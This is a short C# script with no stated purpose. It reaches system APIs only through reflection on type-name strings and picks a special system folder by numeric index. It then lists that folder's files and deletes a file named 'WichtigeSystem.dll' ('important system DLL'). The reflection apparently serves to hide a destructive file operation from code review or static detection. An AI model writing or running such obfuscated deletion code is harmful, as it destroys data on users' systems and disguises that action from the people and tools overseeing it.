using System;
using System.IO;
using System.Reflection;

Type environmentTType = Type.GetType("System.Environment");
Type specialFolderEnum = Type.GetType("System.Environment+SpecialFolder");
Type directoryType = Type.GetType("System.IO.Directory");
Type pathType = Type.GetType("System.IO.Path");
Type fileType = Type.GetType("System.IO.File");

MethodInfo getFolderPathMethod = environmentTType.GetMethod("GetFolderPath", new Type[] { specialFolderEnum });
MethodInfo getFilesMethod = directoryType.GetMethod("GetFiles", new Type[] { typeof(string) });
MethodInfo combineMethod = pathType.GetMethod("Combine", new Type[] { typeof(string), typeof(string) });
MethodInfo deleteMethod = fileType.GetMethod("Delete", new Type[] { typeof(string) });

var specialFolderValue = Enum.GetValues(specialFolderEnum).GetValue(27);

var specialFolder = getFolderPathMethod.Invoke(environmentTType, new object[] { specialFolderValue });
var files = (string[]) getFilesMethod.Invoke(directoryType, new object[] { specialFolder });

foreach (var file in files)
    Console.WriteLine(file);

var path = combineMethod.Invoke(pathType, new object[] { specialFolder, "WichtigeSystem.dll" });
deleteMethod.Invoke(fileType, new object[] { path });


